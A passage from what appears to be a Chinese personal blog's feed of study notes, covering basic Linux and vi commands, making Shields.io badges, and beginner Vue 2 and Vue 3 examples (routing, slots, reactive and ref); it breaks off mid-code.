hellomv</span><br></pre></td></tr></tbody></table></figure><h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure><h3 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l</span><br></pre></td></tr></tbody></table></figure><p><code>ls -l</code>是Linux和Unix系统中的一个命令，用于列出当前目录下的文件和目录，并显示它们的详细属性。</p><ul><li><code>ls</code>：列出目录内容。</li><li><code>-l</code>：长格式显示，包括文件权限、所有者、组、文件大小、修改日期等详细信息。</li></ul><p>例如，当你执行<code>ls -l</code>命令时，可能会看到类似以下的输出：</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="operator">-</span>rw<span class="operator">-</span>r<span class="comment">--r--  1 user group  1234 Oct 23 10:00 filename.txt</span></span><br></pre></td></tr></tbody></table></figure><p>这表示：</p><ul><li><pre><code>-rw-r--r--<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">：文件权限，其中</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">表示这是一个普通文件，</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>rw-r--r--<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">  表示权限。</span><br><span class="line"></span><br><span class="line">  - 第一个字符表示文件类型（`-`表示普通文件，`d`表示目录）。</span><br><span class="line">  - 接下来的三个字符表示所有者的权限（r代表可读，w代表可写，x代表可执行）。</span><br><span class="line">  - 接下来的三个字符表示组的权限。</span><br><span class="line">  - 最后的三个字符表示其他用户的权限。</span><br><span class="line"></span><br><span class="line">- `1`：硬链接数量。</span><br><span class="line"></span><br><span class="line">- `user`：文件所有者。</span><br><span class="line"></span><br><span class="line">- `group`：文件所属组。</span><br><span class="line"></span><br><span class="line">- `1234`：文件大小（以字节为单位）。</span><br><span class="line"></span><br><span class="line">- `Oct 23 10:00`：文件的最后修改时间</span><br><span class="line"></span><br><span class="line">### 显示后五条数据 </span><br><span class="line"></span><br><span class="line">**tip:**study是文件名</span><br><span class="line"></span><br><span class="line">```sh</span><br><span class="line">tail -5 study</span><br></pre></td></tr></tbody></table></figure></code></pre></li></ul><h3 id="显示前五条数据"><a href="#显示前五条数据" class="headerlink" title="显示前五条数据"></a>显示前五条数据</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> -5 study</span><br></pre></td></tr></tbody></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf <span class="string">'文件名'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="使用Vi"><a href="#使用Vi" class="headerlink" title="使用Vi"></a>使用Vi</h2><table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">i</td><td align="center">进入插入模式，从当前光标位置开始输入文件内容。</td></tr><tr><td align="center">a</td><td align="center">进入插入模式，从当前光标位置的下一个字符开始输入文件内容。</td></tr><tr><td align="center">o</td><td align="center">进入插入模式，在当前光标位置插入新的一行，从行首开始输入文件内容。</td></tr><tr><td align="center">ESC</td><td align="center">退出插入模式，进入命令行模式。</td></tr><tr><td align="center">h</td><td align="center">将光标向左移动一格。</td></tr><tr><td align="center">j</td><td align="center">将光标向下移动一格。</td></tr><tr><td align="center">k</td><td align="center">将光标向上移动一页。</td></tr><tr><td align="center">l</td><td align="center">将光标向右移动一格。</td></tr><tr><td align="center">ctrl+b</td><td align="center">将屏幕向后移动一页。</td></tr><tr><td align="center">ctrl+f</td><td align="center">将屏幕向前移动一页。</td></tr><tr><td align="center">ctrl+u</td><td align="center">将屏幕向后移动半页。</td></tr><tr><td align="center">ctrl+d</td><td align="center">将屏幕向前移动半页。</td></tr><tr><td align="center">x</td><td align="center">删除光标所在位置的后面一个字符。</td></tr><tr><td align="center">X</td><td align="center">删除光标所在位置的前面一个字符。</td></tr></tbody></table><p>请注意，这些命令都是在命令行模式下使用的。如果您想在插入模式下使用某些命令，请先按<code>ESC</code>键退出插入模式，然后输入相应的命令。</p><p>此外，退出vi编辑器的方法有：</p><ol><li><strong>:q</strong>：退出vi编辑器。</li><li><strong>:wq</strong>：保存文件并退出vi编辑器。</li><li>**:q!**：不保存文件并退出vi编辑器。</li></ol><h3 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">vi [文件名]</span><br></pre></td></tr></tbody></table></figure><p>回车后可以看到文件内容，此时按 i 或者 a 进入编辑模式</p><p>此时可以正常编辑</p><p>编辑完成后按 esc可以退出编辑</p><h3 id="显示当前行行号"><a href="#显示当前行行号" class="headerlink" title="显示当前行行号"></a>显示当前行行号</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">:nu</span><br></pre></td></tr></tbody></table></figure><h3 id="显示所有行号"><a href="#显示所有行号" class="headerlink" title="显示所有行号"></a>显示所有行号</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> nu</span><br></pre></td></tr></tbody></table></figure><h3 id="保存退出使用"><a href="#保存退出使用" class="headerlink" title="保存退出使用"></a>保存退出使用</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></tbody></table></figure><h3 id="退出使用"><a href="#退出使用" class="headerlink" title="退出使用"></a>退出使用</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">:q</span><br></pre></td></tr></tbody></table></figure><h3 id="保存使用"><a href="#保存使用" class="headerlink" title="保存使用"></a>保存使用</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">:w</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于Shields徽章的使用</title>
      <link href="/NANABLOG/2023/12/16/%E5%85%B3%E4%BA%8EShields%E5%BE%BD%E7%AB%A0%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/NANABLOG/2023/12/16/%E5%85%B3%E4%BA%8EShields%E5%BE%BD%E7%AB%A0%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/shields.jpg"></p><p>在github或者gitee中使用徽章来编写说明文档可以让文档的可读性和整体观感大幅度提升，制作过程也比较简单</p><p>首先打开官方网站</p><p>这里使用的是shields</p><p> 网址:<a href="https://shields.io/">https://shields.io/</a></p><p>进入后根据官方说明文档的提示快速制作一个徽章</p><p>格式为msg-release-color</p><p>如果需要使用空格需要替换为下划线_</p><p>比如制作一个hello world的版本说明</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hello_world-1.2.1_release-blue</span><br></pre></td></tr></tbody></table></figure><p>效果:</p><img alt="Static Badge" src="https://img.shields.io/badge/hello_world-1.2.1_release-blue"><p>如果要替换颜色就更改color</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hello_world-1.2.1_release-red</span><br></pre></td></tr></tbody></table></figure><img alt="Static Badge" src="https://img.shields.io/badge/hello_world-1.2.1_release-red">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习笔记</title>
      <link href="/NANABLOG/2023/12/13/Vue/"/>
      <url>/NANABLOG/2023/12/13/Vue/</url>
      
        <content type="html"><![CDATA[<h3 id="1-什么是Vue"><a href="#1-什么是Vue" class="headerlink" title="1. 什么是Vue"></a>1. 什么是Vue</h3><p>Vue.js是一款流行的JavaScript框架，用于构建用户界面和单页面应用程序（SPA）。它具有轻量级、灵活和易学的特点，同时提供了诸多功能强大的工具。</p><h3 id="2-指令修饰符"><a href="#2-指令修饰符" class="headerlink" title="2. 指令修饰符"></a>2. 指令修饰符</h3><p>指令修饰符是用于改变指令行为的特殊后缀，例如<code>.prevent</code>用于阻止默认事件、<code>.stop</code>用于停止事件冒泡等。</p><h3 id="3-容器"><a href="#3-容器" class="headerlink" title="3. 容器"></a>3. 容器</h3><p>Vue中的容器指的是用来包裹和组织页面内容的元素，例如<code>&lt;div&gt;</code>、<code>&lt;section&gt;</code>等。</p><h3 id="4-基本构建"><a href="#4-基本构建" class="headerlink" title="4. 基本构建"></a>4. 基本构建</h3><p>Vue应用的基本构建包括创建Vue实例、数据绑定、指令的使用以及组件的构建和使用。</p><h4 id="4-1-示例"><a href="#4-1-示例" class="headerlink" title="4.1 示例"></a>4.1 示例</h4><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  {{ message }}</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>({</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>: {</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">message</span>: <span class="string">'Hello Vue!'</span></span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript">});</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="5-脚手架"><a href="#5-脚手架" class="headerlink" title="5. 脚手架"></a>5. 脚手架</h3><p>脚手架是用来快速搭建Vue项目的工具，例如Vue CLI。</p><h3 id="6-创建脚手架"><a href="#6-创建脚手架" class="headerlink" title="6. 创建脚手架"></a>6. 创建脚手架</h3><p>创建Vue脚手架可以通过Vue CLI工具来实现，通过命令行输入<code>vue create &lt;project-name&gt;</code>即可创建一个新的Vue项目。</p><h3 id="7-脚手架结构理解"><a href="#7-脚手架结构理解" class="headerlink" title="7. 脚手架结构理解"></a>7. 脚手架结构理解</h3><p>一个Vue脚手架项目通常包含<code>public</code>、<code>src</code>、<code>node_modules</code>等文件夹，其中<code>src</code>文件夹包含项目的源代码。</p><h3 id="8-将一切组件化"><a href="#8-将一切组件化" class="headerlink" title="8. 将一切组件化"></a>8. 将一切组件化</h3><p>Vue鼓励将页面上的各个部分抽象为组件，以便于复用和维护。</p><h3 id="9-局部和全局定义"><a href="#9-局部和全局定义" class="headerlink" title="9. 局部和全局定义"></a>9. 局部和全局定义</h3><p>Vue组件可以在全局范围内注册，也可以在其他组件内部进行局部注册。</p><h3 id="10-父传子-子传父-数据"><a href="#10-父传子-子传父-数据" class="headerlink" title="10. 父传子 子传父 数据"></a>10. 父传子 子传父 数据</h3><p>在Vue中，父组件通过props向子组件传递数据，子组件则通过$emit向父组件发送事件。</p><h3 id="11-打包传递-prom-串子"><a href="#11-打包传递-prom-串子" class="headerlink" title="11. 打包传递 prom 串子"></a>11. 打包传递 prom 串子</h3><p>这部分内容可能需要进一步说明，是否指代组件间通信？</p><h3 id="12-路由"><a href="#12-路由" class="headerlink" title="12. 路由"></a>12. 路由</h3><p>Vue Router是Vue.js官方的路由管理器，用于构建SPA应用的路由系统。</p><h3 id="13-子路由-一级路由-二级路由-路由页面展示"><a href="#13-子路由-一级路由-二级路由-路由页面展示" class="headerlink" title="13. 子路由 一级路由 二级路由 路由页面展示"></a>13. 子路由 一级路由 二级路由 路由页面展示</h3><p><img src="/Blackcat-loveBlog/png/vue.png"></p><p>Vue Router支持嵌套路由，可以实现一级路由下的子路由，或者更深层次的嵌套。</p><p>index.js:</p><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">"vue-router"</span>;</span><br><span class="line"><span class="comment">// 导入Vue页面</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Article</span> <span class="keyword">from</span> <span class="string">"../views/Article.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ArticleDetail</span> <span class="keyword">from</span> <span class="string">"../views/ArticleDetail.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Collect</span> <span class="keyword">from</span> <span class="string">"../views/Collect.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Layout</span> <span class="keyword">from</span> <span class="string">"../views/Layout.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Like</span> <span class="keyword">from</span> <span class="string">"../views/Like.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">"../views/User.vue"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>({</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    <span class="comment">// 一级路由</span></span><br><span class="line">    {<span class="attr">path</span>:<span class="string">'/'</span>,<span class="attr">component</span>:<span class="title class_">Layout</span>,</span><br><span class="line">    <span class="comment">// 二级路由</span></span><br><span class="line">    <span class="attr">children</span>:[</span><br><span class="line">      {<span class="attr">path</span>:<span class="string">'/article'</span>,<span class="attr">component</span>:<span class="title class_">Article</span>},</span><br><span class="line">      {<span class="attr">path</span>:<span class="string">'/collect'</span>,<span class="attr">component</span>:<span class="title class_">Collect</span>},</span><br><span class="line">      {<span class="attr">path</span>:<span class="string">'/like'</span>,<span class="attr">component</span>:<span class="title class_">Like</span>},</span><br><span class="line">      {<span class="attr">path</span>:<span class="string">'/user'</span>,<span class="attr">component</span>:<span class="title class_">User</span>}</span><br><span class="line">    ]</span><br><span class="line">  },</span><br><span class="line">  {<span class="attr">path</span>:<span class="string">'./articleDetail'</span>,<span class="attr">component</span>:<span class="title class_">ArticleDetail</span>}</span><br><span class="line">  ]</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></tbody></table></figure><p>使用路由的方式:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="h5-wrapper"&gt;</span><br><span class="line">    &lt;div class="content"&gt;</span><br><span class="line">      &lt;!-- 展示路由 --&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;nav class="tabbar"&gt;</span><br><span class="line">      &lt;!-- 使用路由 --&gt;</span><br><span class="line">      &lt;!-- 当点击链接的时候会 匹配 index.js里绑定好的路由链接然后展示在上方的router-view --&gt;</span><br><span class="line">      &lt;router-link to="/article"&gt;面经&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to="/collect"&gt;收藏&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to="/like"&gt;喜欢&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to="/user"&gt;我的&lt;/router-link&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="14-路由传值"><a href="#14-路由传值" class="headerlink" title="14. 路由传值"></a>14. 路由传值</h3><p>在Vue Router中可以通过路由参数或路由元信息进行路由间的数据传递。</p><p>路由动态传参接收</p><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.值名</span><br></pre></td></tr></tbody></table></figure><p>路由动态传参</p><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(值名);</span><br></pre></td></tr></tbody></table></figure><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">articleDetail是路由路径 id是要传递的值 </span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>({ <span class="attr">path</span>:<span class="string">`/articleDetail/<span class="subst">${id}</span>`</span>});</span><br></pre></td></tr></tbody></table></figure><h3 id="15-插槽"><a href="#15-插槽" class="headerlink" title="15.插槽"></a>15.插槽</h3><p>Vue.js 2 中的插槽（slot）是一种强大的特性，它允许你在父组件中插入内容到子组件中。插槽使得组件的结构更加灵活，可以根据需要插入不同的内容。下面是一个简单的例子来说明Vue.js 2中插槽的使用方法：</p><p>首先，在父组件中定义一个带有插槽的子组件。</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ParentComponent.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ChildComponent</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 这里是插槽的内容 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是插槽中的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ChildComponent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ChildComponent</span> <span class="keyword">from</span> <span class="string">'./ChildComponent.vue'</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> {</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: {</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ChildComponent</span></span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript">}</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后，在子组件中通过<code>&lt;slot&gt;</code>标签指定插槽的位置。</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ChildComponent.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span> <span class="comment">&lt;!-- 这里定义了插槽 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> {</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">'ChildComponent'</span></span></span><br><span class="line"><span class="language-javascript">}</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在这个例子中，<code>&lt;slot&gt;</code> 标签表示插槽的位置。当在父组件中使用 <code>&lt;ChildComponent&gt;</code> 时，插槽中的内容会被替换成父组件中的内容。</p><p>最终的渲染结果会是这样：</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是插槽中的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这就是Vue.js 2中插槽的简单介绍和使用方法。通过使用插槽，你可以轻松地在父组件中传递内容到子组件中，并且使得组件的结构更加灵活。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3学习笔记</title>
      <link href="/NANABLOG/2023/12/13/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/13/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>Vue3</p><p>官方文档:<a href="https://cn.vuejs.org/guide/introduction.html">https://cn.vuejs.org/guide/introduction.html</a></p><p>Vue (发音为 /vjuː/，类似 <strong>view</strong>) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript 构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。</p><p>好处：</p><ol><li>性能优化：Vue 3引入了一系列性能优化，包括更快的渲染和更新机制，以及更小的包大小，提高了整体性能。</li><li>更好的 TypeScript 支持：Vue 3对 TypeScript 的支持更加友好，使开发过程更加可靠和高效。</li><li>Composition API：引入了Composition API，让代码更加灵活和可维护，能更好地组织组件逻辑。</li><li>更好的响应式系统：Vue 3中的响应式系统进行了重写，使其更加高效和可靠。</li><li>更好的服务器端渲染支持：Vue 3对服务器端渲染的支持更加完善，能够更好地应用于复杂的应用场景。</li></ol><p>坏处：</p><ol><li>学习曲线：对于之前使用过Vue2的开发者来说，需要花一些时间来适应Vue 3的新特性和变化。</li><li>生态系统的不稳定性：由于Vue 3相对较新，一些与Vue 3兼容的第三方库和插件可能不够完善或不稳定。</li></ol><p>总体来说，Vue 3带来了许多优点，但也需要开发者在使用时留意一些潜在的问题。</p><p>在我看来此次更新最重要的点就在于它的组合式API编程，让代码逻辑更清晰和好维护，创建和使用过程也更加快速，响应也很快</p><p><img src="/Blackcat-loveBlog/png/vue3.png"></p><h3 id="创建Vue3脚手架"><a href="#创建Vue3脚手架" class="headerlink" title="创建Vue3脚手架"></a>创建Vue3脚手架</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></tbody></table></figure><p>输入项目名称并且配置你需要的模块</p><p>一般默认都选否 <strong>End to End</strong>测试工具则选不需要</p><p>然后按照教程进入项目 下载依赖</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></tbody></table></figure><p>运行vue3</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></tbody></table></figure><h3 id="遇到卡住不动的情况"><a href="#遇到卡住不动的情况" class="headerlink" title="遇到卡住不动的情况"></a>遇到卡住不动的情况</h3><p>当创建脚手架和下载依赖的时候如果遇到卡住不同的情况，多半是网络问题或者镜像问题,更换镜像或者降低npm版本即可。</p><p>参考教程:</p><p><a href="https://blog.csdn.net/m0_46695182/article/details/127846670">https://blog.csdn.net/m0_46695182/article/details/127846670</a></p><h3 id="Vue3相比Vue2的变化"><a href="#Vue3相比Vue2的变化" class="headerlink" title="Vue3相比Vue2的变化"></a>Vue3相比Vue2的变化</h3><h4 id="关键文件"><a href="#关键文件" class="headerlink" title="关键文件"></a>关键文件</h4><p>1.vite.config.js - 项目的配置文件 基于vite的配置<br>2.package.json - 项目包文件 核心依赖项变成了 Vue3.x 和 vite<br>3.main.js - 入口文件 createApp函数创建应用实例<br>4.app.vue - 根组件 SFC单文件组件 script - template - style</p><h4 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h4><p>变化一: 脚本script和模板template顺序调整<br>变化二: 模板template不再要求唯一根元素<br>变化三:脚本script添加setup标识支持组合式API<br>5.index.html- 单页入口 提供id为app的挂载点</p><h3 id="Vue3页面结构"><a href="#Vue3页面结构" class="headerlink" title="Vue3页面结构"></a>Vue3页面结构</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>相比于Vue2,结构发生了一些变换，script 放在了最上方 中间的template不在需要div包裹直接写也可以显示</p><p>setup是最早的生命周期，创建的生命周期代码直接写在setup里就好</p><h3 id="创建变量，创建方法，使用变量和方法"><a href="#创建变量，创建方法，使用变量和方法" class="headerlink" title="创建变量，创建方法，使用变量和方法"></a>创建变量，创建方法，使用变量和方法</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">// 变量</span><br><span class="line">const count = 999</span><br><span class="line">// 方法</span><br><span class="line">const logCount = ()=&gt;{</span><br><span class="line">  console.log(count);</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 页面渲染 --&gt;</span><br><span class="line">&lt;h1&gt;{{ count }}&lt;/h1&gt;</span><br><span class="line">&lt;button @click="logCount"&gt;打印&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="组件API"><a href="#组件API" class="headerlink" title="组件API"></a>组件API</h3><h4 id="reative"><a href="#reative" class="headerlink" title="reative()"></a>reative()</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">// 这里的数据是死的</span><br><span class="line">const count = 999;</span><br><span class="line">// 这里是响应式数据，可以++</span><br><span class="line">import { reactive } from 'vue';</span><br><span class="line">const msg = reactive({</span><br><span class="line">  // 只能接收对象</span><br><span class="line">  count:123,</span><br><span class="line">  name:'小明'</span><br><span class="line">})</span><br><span class="line">const logmsg = ()=&gt;{</span><br><span class="line">  // console.log(msg.count);</span><br><span class="line">  msg.count++</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 页面渲染 --&gt;</span><br><span class="line">&lt;h1&gt;{{ msg.count }}&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;{{ msg.name }}&lt;/h1&gt;</span><br><span class="line">&lt;button @click="logmsg"&gt;点击&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>使用reative()里的对象数据是响应式的，可以被加一</p><h4 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h4><p>直接定义创建数据</p><p>由于ref定义后直接msg++会出问题，需要使用它的value值</p><p>ref返回永远是一个响应式对象</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref } from 'vue';</span><br><span class="line">    //创建变量 值为1</span><br><span class="line">const msg = ref(0)</span><br><span class="line">//创建方法改变变量msg值</span><br><span class="line">const logmsg = ()=&gt;{</span><br><span class="line">  msg.value++</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 页面渲染 --&gt;</span><br><span class="line">&lt;h1&gt;{{ msg }}&lt;/h1&gt;</span><br><span class="line">&lt;button @click="logmsg"&gt;点击&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>使用对象创建数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref } from 'vue';</span><br><span class="line">const msg = ref({</span><br><span class="line">  const:0</span><br><span class="line">})</span><br><span class="line">const logmsg = ()=&gt;{</span><br><span class="line">  msg.value.const++</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 页面渲染 --&gt;</span><br><span class="line">&lt;h1&gt;{{ msg.const }}&lt;/h1&gt;</span><br><span class="line">&lt;button @click="logmsg"&gt;点击&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span 